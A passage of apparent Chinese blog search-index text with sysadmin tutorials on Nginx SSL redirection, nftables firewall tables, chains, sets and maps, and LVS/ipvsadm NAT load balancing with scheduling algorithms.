ssl_certificate 和 ssl_certificate_key 指定证书和公钥，并且 listen 443，然后重新启动 Nginx，浏览器就可以用的 https://yourhost 的方式网页了。 123456789101112131415 server { listen 80 ; listen 443 ssl; server_name yichen2.com; root /usr/share/nginx/html; index test.html ; ssl_certificate /root/ssl/yichen1.crt; ssl_certificate_key /root/ssl/yichen1.key; return 301 https://$host$request_uri ;}重启nginx 可以测试下curl -k -I https://yichen2.com","link":"/2020/08/03/nginx%E6%9C%AC%E5%9C%B0ssl%E8%AF%81%E4%B9%A6%E5%88%B6%E4%BD%9C/"},{"title":"nftables","text":"nftables使用在 nftables 中，所有地址族都遵循一个规则。与 iptables 不同，nftables 在用户空间中运行，iptables 中的每个模块都运行在内核（空间）中。它很少需要更新内核，并带有一些新功能，例如映射、地址族和字典。 地址族 地址族确定要处理的数据包的类型。在 nftables 中有六个地址族，它们是 1ip ipv6 inet arp bridge netdev 在 nftables 中，ipv4 和 ipv6 协议可以被合并为一个称为 inet 的单一地址族。因此，我们不需要指定两个规则：一个用于 ipv4，另一个用于 ipv6。如果未指定地址族，它将默认为 ip 协议，即 ipv4。我们感兴趣的领域是 inet 地址族，因为大多数家庭用户将使用 ipv4 或 ipv6 协议。 nftables 典型的 nftables 规则包含三个部分：表、链和规则。 表是链和规则的容器。它们由其地址族和名称来标识。链包含 inet/arp/bridge/netdev 等协议所需的规则，并具有三种类型：过滤器、NAT 和路由。nftables 规则可以从脚本加载，也可以在终端键入，然后另存为规则集。 对于家庭用户，默认链为过滤器。inet 系列包含以下钩子: 1input output forward pre-routing post-routing nftables 使用一个名为 nft 的程序来添加、创建、列出、删除和加载规则。 nft 需要以 root 身份运行或使用 sudo 运行。使用以下命令分别列出、刷新、删除规则集和加载脚本。 命令的使用1234567891011121314列出所有规则集 nft list ruleset清空规则nft flush ruleset删除规则集nft delete table inet filter加载脚本nft -f /etc/nftables/default.nft把当前规则加载到配置文件nft list ruleset &gt; /etc/nftables/defalut.nft重启systemctl restart nftables 输入策略 就像 iptables 一样，防火墙将包含三部分：输入（input）、转发（forward）和输出（output）。在终端中，为输入（input）策略键入以下命令。在开始之前，请确保已刷新规则集。我们的默认策略将会删除所有内容。我们将在防火墙中使用 inet 地址族。将以下规则以 root 身份添加或使用 sudo 运行： 123456增加一张表nft add table inet filter增加规则nft add chain inet filter input { type filter hook input priority 0 \\; counter \\; policy drop \\; }你会注意到有一个名为 priority 0 的东西。这意味着赋予该规则更高的优先级。挂钩通常赋予负整数，这意味着更高的优先级。每个挂钩都有自己的优先级，过滤器链的优先级为 0。你可以检查 nftables Wiki 页面以查看每个挂钩的优先级。 表（Tables）表包含#链[断开的链接：无效的部分]。与iptables中的表不同，nftables中没有内置表。表的数量和名称由用户决定。但是，每个表只有一个地址簇，并且只适用于该簇的数据包。表可以指定五个簇中的一个： nftables簇 iptables实用程序 ip iptables ip6 ip6tables inet iptables和ip6tables arp arptables bridge ebtables ip（即IPv4）是默认簇，如果未指定簇，则使用该簇。 要创建同时适用于IPv4和IPv6的规则，请使用inet。inet允许统一ip和ip6簇，以便更容易地定义规则。 注意： inet不能用于nat类型的链，只能用于filter类型的链。（source） 有关地址簇的完整描述，请参见nft(8)中的ADDRESS FAMILIES章节。 在以下情况中，family是可选的，如果未指定则设为ip。 创建表 创建一个新的表： 123# nft add table family table我设置为inet类型的表 表名为 filternft add table inet filter 列出表 列出所有表： 1# nft list tables 列出表中的链和规则 列出指定表中的所有链和规则： 1# nft list table inet filter 例如，要列出inet簇中filter表中的所有规则： 1# nft list table inet filter 删除表 删除一个表： 1# nft delete table family table 只能删除不包含链的表。 清空表 要清空一个表中的所有规则： 1# nft flush table family table 链（Chains）链的目的是保存#规则[断开的链接：无效的部分]。与iptables中的链不同，nftables没有内置链。这意味着与iptables不同，如果链没有使用netfilter框架中的任何类型或钩子，则流经这些链的数据包不会被nftables触及。 链有两种类型。基本链是来自网络栈的数据包的入口点，其中指定了钩子值。常规链可以作为更好地处理的跳转目标。 在以下情况中，*family*是可选的，如果未指定则设为ip。 创建链 常规链 将名为*chain*的常规链添加到名为*filter*的表中： 1# nft add chain family filter chain 例如，将名为input的常规链添加到inet簇中名为filter的表中： 123# nft add chain inet filter inputnft delete chain inet filter input 删除 基本链 添加基本链，需要指定钩子和优先级值： 1# nft add chain family table chain { type type hook hook priority priority \\; } *type*可以是filter、route或者nat。 IPv4/IPv6/Inet地址簇中，*hook*可以是prerouting、input、forward、output或者postrouting。其他地址簇中的钩子列表请参见nft(8)。 *priority*采用整数值。数字较小的链优先处理，并且可以是负数。[3] 例如，添加筛选输入数据包的基本链： 123# nft add chain inet filter input { type filter hook input priority 0\\; }增加一个output钩子nft add chain inet filter output { type filter hook output priority 0\\; } 将上面命令中的add替换为create则可以添加一个新的链，但如果链已经存在，则返回错误。 列出规则 列出一个链中的所有规则： 1# nft list chain family table chain 例如，要列出inet中filter表的output链中的所有规则： 1# nft list chain inet filter output 编辑链 要编辑一个链，只需按名称调用并定义要更改的规则。 1# nft chain family table chain { [ type type hook hook device device priority priority \\; policy &lt;policy&gt; \\; ] } 例如，将默认表中的input链策略从accept更改为drop： 1# nft chain inet filter input { policy drop \\; } 删除链 删除一个链： 1# nft delete chain inet filter output 清空链中的规则 清空一个链的规则： 1# nft flush chain inet filter output 规则（Rules）规则由语句或表达式构成，包含在链中。 添加规则 提示： iptables-translate实用程序何以将iptables规则转换成nftables格式。 将一条规则添加到链中： 1# nft add rule family table chain handle handle statement 规则添加到*handle*处，这是可选的。如果不指定，则规则添加到链的末尾。 将规则插入到指定位置： 1# nft insert rule family table chain handle handle statement 如果未指定*handle*，则规则插入到链的开头。 例如：增加规则允许所有访问22端口 12345nft add rule inet filter input tcp dport 22 accept允许来源ip 192.168.224.0网段的访问nft add rule inet filter input ip saddr 192.168.224.0 tcp dport 22 accept允许 80-99端口放行nft add rule inet filter input tcp dport 80-99 accept 表达式 通常情况下，*statement*包含一些要匹配的表达式，然后是判断语句。结论语句包括accept、drop、queue、continue、return、jump *chain*和goto *chain*。也可能是其他陈述。有关信息信息，请参阅nft(8)。 nftables中有多种可用的表达式，并且在大多数情况下，与iptables的对应项一致。最明显的区别是没有一般或隐式匹配。一般匹配是始终可用的匹配，如--protocol或--source。隐式匹配是用于特定协议的匹配，如TCP数据包的--sport。 以下是可用匹配的部分列表： meta （元属性，如接口） icmp （ICMP协议） icmpv6 （ICMPv6协议） ip （IP协议） ip6 （IPv6协议） tcp （TCP协议） udp （UDP协议） sctp （SCTP协议） ct （链接跟踪） 以下是匹配参数的部分列表（完整列表请参见nft(8) 1234567891011121314151617181920212223242526272829303132333435363738meta: oif &lt;output interface INDEX&gt; iif &lt;input interface INDEX&gt; oifname &lt;output interface NAME&gt; iifname &lt;input interface NAME&gt; （oif 和 iif 接受字符串参数并转换为接口索引） （oifname 和 iifname 更具动态性，但因字符串匹配速度更慢）icmp: type &lt;icmp type&gt;icmpv6: type &lt;icmpv6 type&gt;ip: protocol &lt;protocol&gt; daddr &lt;destination address&gt; saddr &lt;source address&gt;ip6: daddr &lt;destination address&gt; saddr &lt;source address&gt;tcp: dport &lt;destination port&gt; sport &lt;source port&gt;udp: dport &lt;destination port&gt; sport &lt;source port&gt;sctp: dport &lt;destination port&gt; sport &lt;source port&gt;ct: state &lt;new | established | related | invalid&gt; 注意： nft不使用/etc/services文件匹配端口号和名称，而是使用内置列表[失效链接 2020-08-04 ⓘ]。要在命令行显示端口映射，请使用 nft describe tcp dport。 提示和技巧简单可用的防火墙 详细信息参见 Simple stateful firewall 。 单一计算机 清空当前规则集： 1# nft flush ruleset 添加一个表： 1# nft add table inet filter 添加input、forward和output三个基本链。input和forward的默认策略是drop。output的默认策略是accept。 123# nft add chain inet filter input { type filter hook input priority 0 \\; policy drop \\; }# nft add chain inet filter forward { type filter hook forward priority 0 \\; policy drop \\; }# nft add chain inet filter output { type filter hook output priority 0 \\; policy accept \\; } 添加两个与TCP和UDP关联的常规链： 12# nft add chain inet filter TCP# nft add chain inet filter UDP related和established的流量会accept： 1# nft add rule inet filter input ct state related,established accept loopback接口的流量会accept： 1# nft add rule inet filter input iif lo accept 无效的流量会drop： 1# nft add rule inet filter input ct state invalid drop 新的echo请求（ping）会accept： 1# nft add rule inet filter input ip protocol icmp icmp type echo-request ct state new accept 新的UDP流量跳转到UDP链： 1# nft add rule inet filter input ip protocol udp ct state new jump UDP 新的TCP流量跳转到TCP链： 1# nft add rule inet filter input ip protocol tcp tcp flags \\&amp; \\(fin\\|syn\\|rst\\|ack\\) == syn ct state new jump TCP 未由其他规则处理的所有通信会reject： 123# nft add rule inet filter input ip protocol udp reject# nft add rule inet filter input ip protocol tcp reject with tcp reset# nft add rule inet filter input counter reject with icmp type prot-unreachable 此时，应决定对传入连接打开哪些端口，这些由TCP和UDP链处理。例如，要打开web服务器的连接端口，添加： 1# nft add rule inet filter TCP tcp dport 80 accept 要打开web服务器HTTPS连接端口443： 1# nft add rule inet filter TCP tcp dport 443 accept 允许SSH连接端口22： 1# nft add rule inet filter TCP tcp dport 22 accept 允许传入DNS请求： 12# nft add rule inet filter TCP tcp dport 53 accept# nft add rule inet filter UDP udp dport 53 accept 确保更改是永久的。 nftables详细语法创建表nftables 的每个表只有一个地址簇，并且只适用于该簇的数据包。表可以指定五个簇中的一个： \\nftables\\*簇*** \\iptables\\*命令行工具*** ip iptables ip6 ip6tables inet iptables和ip6tables arp arptables bridge ebtables inet 同时适用于 IPv4 和 IPv6 的数据包，即统一了 ip 和 ip6 簇，可以更容易地定义规则，下文的示例都将采用 inet 簇。 先创建一个新的表： 1nft add table inet nftables_svc 列出所有规则: 123nft list rulesettable inet nftables_svc {} 现在表中还没有任何规则，需要创建一个链来保存规则。 创建链链是用来保存规则的，和表一样，链也需要被显示创建，因为 nftables 没有内置的链。链有以下两种类型： 常规链 : 不需要指定钩子类型和优先级，可以用来做跳转，从逻辑上对规则进行分类。 基本链 : 数据包的入口点，需要指定钩子类型和优先级。 创建常规链： 1nft add chain inet nftables_svc my_utility_chain 创建基本链： 1nft add chain inet nftables_svc INPUT { type filter hook input priority 0 \\;} 反斜线（\\）用来转义，这样 shell 就不会将分号解释为命令的结尾。 priority 采用整数值，可以是负数，值较小的链优先处理。 列出链中的所有规则： 123456789101112nft list chain inet nftables_svc my_utility_chaintable inet nftables_svc { chain my_utility_chain { }}nft list chain inet nftables_svc INPUTtable inet nftables_svc { chain INPUT { type filter hook input priority filter; policy accept; }} 创建规则有了表和链之后，就可以创建规则了，规则由语句或表达式构成，包含在链中。下面添加一条规则允许 SSH 登录： 1nft add rule inet nftables_svc INPUT tcp dport ssh accept add 表示将规则添加到链的末尾，如果想将规则添加到链的开头，可以使用 insert。 1nft insert rule inet nftables_svc INPUT tcp dport http accept 也可以将规则插入到链的指定位置，有两种方法： 1、 使用 index 来指定规则的索引。add 表示新规则添加在索引位置的规则后面，inser 表示新规则添加在索引位置的规则前面。index 的值从 0 开始增加。 12nft insert rule inet nftables_svc INPUT index 1 tcp dport nfs acceptnft add rule inet nftables_svc INPUT index 1 tcp dport 888 accept index 类似于 iptables 的 -I 选项，但有两点需要注意：一是 index 的值是从 0 开始的；二是 index 必须指向一个存在的规则，比如 nft insert rule … index 0 就是非法的。 2、 使用 handle 来指定规则的句柄。add 表示新规则添加在索引位置的规则后面，inser 表示新规则添加在索引位置的规则前面。handle 的值可以通过参数 –handle 获取。 1234567891011121314nft --handle list rulesettable inet nftables_svc { # handle 41 chain my_utility_chain { # handle 1 } chain INPUT { # handle 2 type filter hook input priority filter; policy accept; tcp dport 80 accept # handle 4 tcp dport 2049 accept # handle 5 tcp dport 888 accept # handle 6 tcp dport 22 accept # handle 3 }} 使用add 12nft add rule inet nftables_svc INPUT handle 4 tcp dport 666 acceptnft insert rule inet nftables_svc INPUT handle 5 tcp dport 777 accept 在 nftables 中，句柄值是固定不变的，除非规则被删除，这就为规则提供了稳定的索引。而 index 的值是可变的，只要有新规则插入，就有可能发生变化。一般建议使用 handle 来插入新规则。 也可以在创建规则时就获取到规则的句柄值，只需要在创建规则时同时加上参数 –echo 和 –handle。 123nft --echo --handle add rule inet nftables_svc INPUT udp dport 333 acceptadd rule inet nftables_svc INPUT udp dport 333 accept # handle 9 删除规则 单个规则只能通过其句柄删除，首先需要找到你想删除的规则句柄： 123nft --handle list ruleset删除句柄9的规则nft delete rule inet nftables_svc INPUT handle 9 列出规则 前面的示例都是列出了所有规则，我们还可以根据自己的需求列出规则的一部分。例如： 列出某个表中的所有规则： 1nft list table inet nftables_svc 列出某条链中的所有规则： 1nft list chain inet nftables_svc INPUT 集合nftables 的语法原生支持集合，可以用来匹配多个 IP 地址、端口号、网卡或其他任何条件。 匿名集合 集合分为匿名集合与命名集合，匿名集合比较适合用于将来不需要更改的规则。 例如，下面的规则允许来自源 IP 处于 192.168.224.1 ~ 192.168.224.231 这个区间内的主机的流量。 1nft add rule inet nftables_svc INPUT ip saddr { 192.168.224.1, 192.168.224.231 } accept 匿名集合的缺点是，如果需要修改集合，就得替换规则。如果后面需要频繁修改集合，推荐使用命名集合。 之前的示例中添加的规则也可以通过集合来简化 1nft add rule inet nftables_svc INPUT tcp dport { http,nfs,ssh } accept iptables 可以借助 ipset 来使用集合，而 nftables 原生支持集合，所以不需要借助 ipset。 命名集合 nftables 也支持命名集合，命名集合是可以修改的。创建集合需要指定其元素的类型，当前支持的数据类型有： ipv4_addr : IPv4 地址 ipv6_addr : IPv6 地址 ether_addr : 以太网（Ethernet）地址 inet_proto : 网络协议 inet_service : 网络服务 mark : 标记类型 先创建一个空的命名集合：名字为allowed_ssh_ipv4_ips 类型为 ipv4_addr 12345678910nft add set inet nftables_svc allowed_ssh_ipv4_ips { type ipv4_addr \\;} nft list sets table inet nftables_svc { set allowed_ssh_ipv4_ips { type ipv4_addr }} 要想在添加规则时引用集合，可以使用 @ 符号跟上集合的名字。下面的规则表示将集合allowed_ssh_ipv4_ips 中的 IP 地址添加到白名单中。 1nft insert rule inet nftables_svc INPUT ip saddr @allowed_ssh_ipv4_ips accept 向集合中添加元素： 1nft add element inet nftables_svc allowed_ssh_ipv4_ips { 162.247.4.225, 34.96.147.71, 47.244.41.255, 154.194.255.73, 154.194.255.73, 47.244.62.17, 192.168.224.0,} 如果你向集合中添加一个区间就会报错： 12345nft add element inet nftables_svc allowed_ssh_ipv4_ips { 192.168.224.1-192.168.224.231}Error: Set member cannot be range, missing interval flag on declarationadd element inet nftables_svc allowed_ssh_ipv4_ips { 192.168.224.1-192.168.224.231} ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 要想在集合中使用区间，需要加上一个 flag interval，因为内核必须提前确认该集合存储的数据类型，以便采用适当的数据结构。 支持区间 创建一个支持区间的命名集合： 1234nft add set inet nftables_svc my_range_set { type ipv4_addr \\; flags interval \\; }添加元素nft add element inet nftables_svc my_range_set { 192.168.224.1-192.168.224.231}nft add element inet nftables_svc my_range_set { 192.168.223.0/24} 子网掩码表示法会被隐式转换为 IP 地址的区间，你也可以直接使用区间 10.20.20.0-10.20.20.255 来获得相同的效果。 创建一个集合放行端口 1nft add set inet nftables_svc allowed_ports { type inet_service \\; flags interval \\; } 添加规则引用集合 1nft add rule inet nftables_svc INPUT tcp dport @allowed_ports accept 向集合里添加端口 1nft add element inet nftables_svc allowed_ports { telnet, http, https, 25, 88, 90-95, 666, 888, 873, 2018-2022, 2097-2098, 3656, 999, 8000, 8080, 8989, 9000 } 级联不同类型 命名集合也支持对不同类型的元素进行级联，通过级联操作符 . 来分隔。例如，下面的规则可以一次性匹配 IP 地址、协议和端口号。 123nft add set inet nftables_svc my_concat_set { type ipv4_addr . inet_proto . inet_service \\; }nft list set inet nftables_svc my_concat_set 向集合中添加元素： 1nft add element inet nftables_svc my_concat_set { 192.168.224.12 . tcp . telnet } 在规则中引用级联类型的集合和之前一样，但需要标明集合中每个元素对应到规则中的哪个位置。 1nft add rule inet nftables_svc INPUT ip saddr . meta l4proto . tcp dport @my_concat_set accept 这就表示如果数据包的源 IP、协议类型、目标端口匹配 192.168.224.12、tcp、telnet 时，nftables 就会允许该数据包通过。 匿名集合也可以使用级联元素，例如： 1nft add rule inet nftables_svc INPUT ip saddr . meta l4proto . udp dport { 192.168.224.12 . udp . bootps } accept nftables 级联类型的集合类似于 ipset 的聚合类型，例如 hash:ip,port。 字典 字典是 nftables 的一个高级特性，它可以使用不同类型的数据并将匹配条件映射到某一个规则上面，并且由于是哈希映射的方式，可以完美的避免链式规则跳转的性能开销。 例如，为了从逻辑上将对 TCP 和 UDP 数据包的处理规则拆分开来，可以使用字典来实现，这样就可以通过一条规则实现上述需求。 123456nft add chain inet nftables_svc TCPnft add chain inet nftables_svc UDP nft add rule inet nftables_svc INPUT meta l4proto vmap { tcp : jump TCP, udp : jump UDP }nft list chain inet nftables_svc INPUT 和集合一样，除了匿名字典之外，还可以创建命名字典： 1nft add map inet nftables_svc my_vmap { type inet_proto : verdict \\; } 向字典中添加元素： 1nft add element inet nftables_svc my_vmap { 192.168.224.10 : drop, 192.168.224.11 : accept } 后面就可以在规则中引用字典中的元素了： 1nft add rule inet nftables_svc INPUT ip saddr vmap @my_vmap 表与命名空间 在 nftables 中，每个表都是一个独立的命名空间，这就意味着不同的表中的链、集合、字典等都可以有相同的名字。例如： 1234567nft add table inet table_onenft add chain inet table_one INPUTnft add table inet table_twonft add chain inet table_two INPUT 有了这个特性，不同的应用就可以在相互不影响的情况下管理自己的表中的规则，而使用 iptables 就无法做到这一点。 当然，这个特性也有缺陷，由于每个表都被视为独立的防火墙，那么某个数据包必须被所有表中的规则放行，才算真正的放行，即使 table_one 允许该数据包通过，该数据包仍然有可能被 table_two 拒绝。为了解决这个问题，nftables 引入了优先级，priority 值越高的链优先级越低，所以 priority 值低的链比 priority 值高的链先执行。如果两条链的优先级相同，就会进入竞争状态。 备份与恢复以上所有示例中的规则都是临时的，要想永久生效，我们可以将规则备份，重启后自动加载恢复，其实 nftables 的 systemd 服务就是这么工作的。 备份规则： 1nft list ruleset &gt; /root/nftables.conf 加载恢复： 1nft -f /root/nftables.conf 在 CentOS 8 中，nftables.service 的规则被存储在 /etc/nftables.conf 中，其中 include 一些其他的示例规则，一般位于 /etc/sysconfig/nftables.conf 文件中，但默认会被注释掉。 工作环境nftables配置实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# drop any existing nftables rulesetflush ruleset# a common table for both IPv4 and IPv6table inet nftables_svc { # 允许ping set allowed_protocols { type inet_proto elements = { icmp, icmpv6 } } # 放行本地回环及docker0网卡 set allowed_interfaces { type ifname elements = { &quot;lo&quot;, &quot;docker0&quot; } } # ssh白名单 set allowed_ssh_ipv4_ips { type ipv4_addr elements = { 162.247.4.225, 34.96.147.71, 47.244.41.255, 114.199.68.31, 46.19.166.241, 49.213.26.92, 58.82.202.253, 58.82.246.106, 58.82.247.186, 154.194.255.73, 154.194.255.73, 47.244.62.176, 202.60.234.56, 123.59.194.60, 154.194.254.176, 192.168.224.0, } } # 端口放行 set allowed_ports { type inet_service flags interval elements = { telnet, http, https, 25, 88, 90-95, 666, 888, 873, 2018-2022, 2097-2098, 3656, 999, 8000, 8080, 8989, 9000 } } chain INPUT { type filter hook input priority 0 policy drop ct state { established, related } accept meta l4proto @allowed_protocols accept iifname @allowed_interfaces accept ip saddr @allowed_ssh_ipv4_ips tcp dport 22 accept tcp dport @allowed_ports accept #zabbix ip saddr 47.244.62.176 tcp dport 10050 accept } chain OUTPUT { type filter hook output priority 0 policy drop ct state { new, established, related, untracked } accept } chain FORWARD { type filter hook forward priority 0 policy accept }} 后期新增ssh的ip白名单 1nft add element inet nftables_svc allowed_ssh_ipv4_ips { 192.168.224.1} 后期新增端口访问 1nft add element inet nftables_svc allowed_ports {3306-3308, 6397} 保存规则 1nft list ruleset &gt; /etc/nftables/default.nft","link":"/2020/09/30/nftables/"},{"title":"lvs-ipvsadm调度","text":"集​​群(cluster)​是​由​两​台​或​多​台​计​算​机​(称​​为节点node​或成员member​)共​​同​执​行​任​务​群集 12345678910集群方式存储集群 GFS 共享存储负载均衡 LB load balance高可用 HA high avavilable高性能计算 LB 负载均衡集群一般用于请求负载分发，也就是按一定的算法把不同的请求调度给不同的节点，这些节点提供的都是相同的服务。解决单台服务器压力过大的问题。 1234567891011 客户端 调度器(lb服务器) ---- 备调度器​ web1 web2 web3 (real servers) 100000 100000 100000 100000 50000 0 调度算法 rr健康检查会话保持 (session复制;利用类似memcache这种缓存数据保存session信息;session粘贴)数据一致性:rsync同步,Gluster.共享存储，分布式存储. 常用的负载均衡方式1。客户手动选择 如：下载网站很多镜像站点 下载地址一下载地址二 2,location跳转 rewrite跳转 www.sina.com/sports/cba/www.sina.com/sports/nba/ 3, DNS轮询方式 对同一个域名加多条A记录 dig www.sina.com 可靠性低 负载分配不均衡,没有多种算法 没有健康检查，如果一个A记录节点挂了，DNS仍然会解析。就算你把DNS这条A记录改了，但DNS缓存功能会让整个网络过很久的时间才会都认这个改变 4, 四层/七层负载均衡 硬件解决方案：&lt;----一般都是四层调度，也有些设备支持七层调度。 F5 BIG-IP Citrix NetScaler Cisco CSS 软件解决方案： lvs 四层调度（算法多） keepalived（包括LVS） rhel7自带(keepalived仅仅为负载均衡提供高可用方案，本身并不参与负载均衡功能) nginx 七层调度 Haproxy 四层或七层调度，特色在于七层调度 squid (缓存加基本的调度) --这一类不能完全归于负载均衡软件里，只能做静态页面的 应用表示会话传输 IP，PORT网络数据链路 makc地址物理 软件调度的优势： 软件成本低 硬件技术支持不够迅速 软件的可控性比较强 负载均衡集群 LVS linux virtual server （linux虚拟主机） 开源 lvs 十个调度算法： rr、wrr、lc、wlc、lblc、lblcr、dh、sh、sed、 nq 1.轮询调度（Round Robin）(简称rr)2.加权轮叫（Weighted Round Robin）（简称wrr)3.最少链接（Least Connections）(LC)4.加权最少链接（Weighted Least Connections）(WLC)5.基于局部性的最少链接（Locality-Based Least Connections）(LBLC)6.带复制的基于局部性最少链接（Locality-Based Least Connections with Replication）(LBLCR)7.目标地址散列（Destination Hashing）(DH)8.源地址散列（Source Hashing）(SH)9. 最短的期望的延迟（Shortest Expected Delay Scheduling SED）(SED)10.最少队列调度（Never Queue Scheduling NQ）(NQ) 最常用的两个算法介绍： 2.加权轮叫（Weighted Round Robin）（简称wrr)调度器通过“加权轮叫”调度算法根据真实服务器的不同处理能力来调度访问请求。这样可以保证处理能力强的服务器能处理更多的访问流量。调度器可以自动问询真实服务器的负载情况，并动态地调整其权值。 4.加权最少链接（Weighted Least Connections）(WLC)在集群系统中的服务器性能差异较大的情况下，调度器采用“加权最少链接”调度算法优化负载均衡性能，具有较高权值的服务器将承受较大比例的活动连接负载。调度器可以自动问询真实服务器的负载情况，并动态地调整其权值。 调度算法：（这里只实现8种）1，rr round-robin 轮循 均等地对待每台真实服务器2, wrr weighted round-robin 加权轮循 根据真实服务器的不同处理能力来调度访问请求，并可以动态地调整权值3, lc least-connection 最少连接 根据连接数来分配，连接数少的服务器会多分配。4, wlc weighted least-connection 加权最少连接 同时考量服务器的处理能力和连接数来进行分配 wlc-加权的lc(加权是为了考虑服务器性能)，是最常用的算法(并且是lvs默认算法)5, lblc 基于局部性的最少连接 主要用于cache集群6, lblcwr 带复制的基于局部性的最少连接 主要用于cache集群7, dh destionation hashing 目标地址散列 8, sh source hashing 源地址散列 负载均衡技术： NAT通过网络地址转换，调度器重定请求报文的目标地址。，将请求分发给下端的真实服务器，真实服务器响应，再通过调度器返回给客户端。这种架构，调度器容易成为整个架构的瓶颈。 DR DIRECTING Routing:类似tunnel技术这种方式没有隧道的开锁，对于后台真实服务器也没有必须支持IP隧道协议的要求；但是要求调度器必须有一块网卡和真实服务器在同一物理网段。 ============================================================== LVS－NAT简单的可以看作是：利用DNAT的解析原理，来解析出不同的DNAT来实现负载均衡的目的。 有算法的可以DNAT多个目标的DNAT 客户端 192.168.2.x ｜ ｜ ｜ ｜ 外网 192.168.2.59 ［lvs负载均衡调度器] | | 内网 192.168.224.10 | | | | | | | WEB1 WEB2 web3 web4 192.168.224.11 192.168.224.12 web1和web2网关都要指向192.168.224.10 SIP:192.168.2.x DIP:192.168.2.59到达LVS调度器后，通过算法调给后台web(realserver),假设调给了web1SIP:192.168.2.x DIP:192.168.224.11到达web1后，返回SIP:192.168.224.11 DIP:192.168.2.x通过网关指向回给LVS调度器SIP:192.168.224.11 DIP:192.168.2.x因为进来时做了DNAT，所以回去时自动SNATSIP:192.168.2.59 DIP:192.168.2.x 问题:上图中的调度器能否只有一个网卡,也就是没有内外网双网卡之分? 答案:不行,NAT的意思就是从一个网段转换到另一个网段,单网段不符合; 如果真的整个架构全部是同一网段,LVS也能帮你调度,但回来的时候,realserver会直接回到客户端(因为它和客户端也是同一网段,是直通的),而不会经过调度器回到客户端 实验前准备：(centos7.3平台)1,静态ip2,主机名配置和绑定4,关闭iptables,selinux6,准备客户端，只需要有firefox或elinks命令就可以了 第一大步:lvs调度器上的配置1,在调度器上打开ip转发,因为在上面架构图中,调度器会用到两个IP段的转发 1234vim /etc/sysctl.confnet.ipv4.ip_forward = 1 #开启路由转发或者：sed -i 10c'net.ipv4.ip_forward = 1' /etc/sysctl.conf #在第10行下面增加一行sysctl -p #使之生效 2,在调度器(director)上安装软件包安装ipvsadm 1yum install ipvsadm -y 3:按照架构图来配置lvs rr轮询调度12345ipvsadm -A -t 192.168.2.59:80 -s rr #A参数增加服务，s参数后接调度算法，t表示 tcp服务 这里先使用rripvsadm -a -t 192.168.2.59:80 -r 192.168.224.11:80 -m #a参数增加真实服务器，-r代表后接一个realserver;-m代表NAT架构ipvsadm -a -t 192.168.2.59:80 -r 192.168.224.12:80 -m (这里有一个小问题，在此版本里:lvs调度器有些人eth0使用192.168.1.2/24这个IP，eth0:0使用192.168.2.59/24这个IP;使用eth0:0的网段做此实验会有问题，测试会卡住)上面三条写的就是访问192.168.2.59的80端口的访问会以rr算法调给192.168.224.11的80和192.168.224.12的80;如果你服务的端口不一样,直接按上面的规则修改就可以 12345678ipvsadm -ln #查看ipvsadm调度规则，-l：表示列表形式，-n：参数表示以IP方式显示机器IP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.2.59:80 rr 实时访问数 历史访问数 -&gt; 192.168.224.11:80 Masq 1 0 0 -&gt; 192.168.224.12:80 Masq 1 0 0 ipvsadm -Sn &gt; /etc/sysconfig/ipvsadm #规则保存到此文件 S:参数表示输出规则到标准输出 1234cat /etc/sysconfig/ipvsadm-A -t 192.168.2.59:80 -s rr-a -t 192.168.2.59:80 -r 192.168.224.11:80 -m -w 1-a -t 192.168.2.59:80 -r 192.168.224.12:80 -m -w 1 启动 ipvsadm systemctl start ipvsadmsystemctl enable ipvsadmsystemctl status ipvsadm （# ipvsadm -d -t 192.168.2.59:80 -r 192.168.224.11:80这是删除其中一条的方法;但会删除当前使用的规则，也会删除保存的文件里的规则) 第二大步：1,在 web1 和 web2 安装httpd并在不同的web服务器上建立不同的主页文件内容（方便测试)，并启动httpd,网关指回192.168.224.10 #伪装lvs的ip 在web1服务器上做 12345yum install httpd httpd-devel -yecho 'web1'&gt; /var/www/html/index.html systemctl start httpdsystemctl enable httpdroute add default gw 192.168.224.10 #这是临时加网关，永久加网关就请配置到网络配置文件里 在web2服务器上做 12345yum install httpd httpd-devel -yecho 'web2'&gt; /var/www/html/index.html systemctl start httpdsystemctl enable httpdroute add default gw 192.168.224.10 #这是临时加网关，永久加网关就请配置到网络配置文件里 第四大步：2,在client端进行访问验证curl 192.168.2.59 验证结果为web1主页和web2主页轮循 3, sh源地址散列算法会话保持：永久粘贴和持续性的比较sh算法实现永久会话粘贴(类似nginx的ip_hash) 修改策略为源地址散列算法 123ipvsadm -E -t 192.168.2.59:80 -s shE:参数表示修改服务，-t：表示TCP连接，-s:参数表示策略，sh：表示源地址散列算法 1234567ipvsadm -lnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.2.59:80 sh -&gt; 192.168.224.11:80 Masq 1 0 11 -&gt; 192.168.224.12:80 Masq 1 0 0 客户端测试结果:如果客户端第一次访问的是web1，那么永远访问的是web1(web1挂了还是访问web1). 4, 通过持续性persistent实现非永久性的会话保持: ipvsadm -E -t 192.168.2.59:80 -s rr -p 10 1234567ipvsadm -lnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.2.59:80 rr persistent 10 -&gt; 192.168.224.11:80 Masq 1 0 0 -&gt; 192.168.224.12:80 Masq 1 0 0 关于persistent 10 ipvsadm -lnc 参数c表示列出所有连接 IPVS connection entriespro expire state source virtual destinationTCP 00:06 NONE 192.168.2.x:0 192.168.2.59:80 192.168.224.11:80TCP 01:56 TIME_WAIT 192.168.2.x:39353 192.168.2.59:80 192.168.224.11:80 通过上面的命令看到客户端192.168.2.x访问了一次192.168.2.59:80，被调度给了192.168.224.11:80 当一个client访问vip的时候，ipvs或记录一条状态为NONE的信息，NONE状态前的面expire值是persistence_timeout的值（我这里设为10,所以从10开始计算），然后根据时钟主键变小，在以下记录存在期间，同一client ip连接上来，都会被分配到同一个后端。FIN_WAIT的值就是tcp tcpfin udp的超时时间，当NONE的值为0时，如果FIN_WAIT还存在，那么NONE的值会从新变成60秒，再减少，直到FIN_WAIT消失以后，NONE才会消失，只要NONE存在，同一client的访问，都会分配到统一real 